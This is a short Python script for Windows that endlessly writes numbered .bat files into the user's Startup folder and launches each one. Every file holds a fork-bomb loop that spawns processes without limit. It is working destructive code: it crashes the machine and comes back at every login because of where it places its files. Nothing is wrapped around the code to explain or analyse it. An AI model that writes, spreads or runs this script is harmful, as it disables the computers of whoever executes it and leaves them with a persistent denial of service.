import subprocess
import getpass
import os

userid ="C:\\Users\\"
username = getpass.getuser()

def CSIstartup(): #CSI = create script in
        global userid
        startupfolder = (R"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\\")
        total = str(userid) + str(username) + str(startupfolder)
        if os.path.exists(total):
                x = 0
                while True:
                        x = x + 1
                        f = open((str(total)+str(x)+'.bat'),"w+")
                        f.write("""
                        :a
                        start
                        goto a
                                """)
                        f.close
                        subprocess.Popen((str(total))+(str(x)+'.bat'), shell=True)
        else:
                print("Code: 43")

CSIstartup()

